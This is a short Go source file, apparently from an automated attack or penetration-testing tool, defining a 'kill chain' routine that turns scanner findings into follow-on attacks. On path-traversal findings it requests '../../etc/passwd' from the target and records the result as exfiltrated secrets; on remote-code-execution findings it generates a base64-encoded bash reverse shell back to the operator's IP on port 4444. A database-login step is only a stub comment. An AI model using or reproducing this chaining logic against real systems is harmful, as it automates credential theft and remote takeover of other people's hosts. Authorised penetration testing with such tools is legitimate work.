package engine

import (
	"fmt"
	"strings"
)

// KillChain orchestrates multi-step attacks based on initial findings
func (e *Engine) RunKillChain(target string, findings []Result) []Result {
	fmt.Printf("[KILL-CHAIN] Orchestrating automated multi-step attacks for: %s...\n", target)
	var additionalFindings []Result

	for _, res := range findings {
		// 1. Path Traversal -> Search for Secrets
		if strings.Contains(res.TemplateID, "traversal") || strings.Contains(res.TemplateID, "lfi") {
			fmt.Printf("    [CHAIN] Detected LFI. Attempting secret exfiltration...\n")
			secrets := e.DownloadAndExfiltrate(res.Target + "../../../../../../../../../etc/passwd")
			if len(secrets) > 0 {
				additionalFindings = append(additionalFindings, Result{
					TemplateID: "chain-lfi-secrets",
					Target:    res.Target,
					Evidence:   "Credential leak via chained LFI attack.",
					ExfiltratedData: secrets,
				})
			}
		}

		// 2. Secret Found -> DB/Port Probing
		if len(res.ExfiltratedData) > 0 {
			fmt.Printf("    [CHAIN] Found secrets. Attempting database/port probing...\n")
			// logic to attempt DB login with found credentials would go here
		}

		// 3. RCE Found -> Automated Shell Generation
		if strings.Contains(res.TemplateID, "rce") {
			fmt.Printf("    [CHAIN] RCE confirmed. Creating specialized reverse shell payload...\n")
			lip := GetLIP()
			shell := GenerateReverseShell(BashShell, lip, 4444, "base64")
			additionalFindings = append(additionalFindings, Result{
				TemplateID: "chain-rce-payload",
				Target:    res.Target,
				Evidence:   "Generated shell: " + shell,
				Exploited:  true,
			})
		}
	}

	return additionalFindings
}
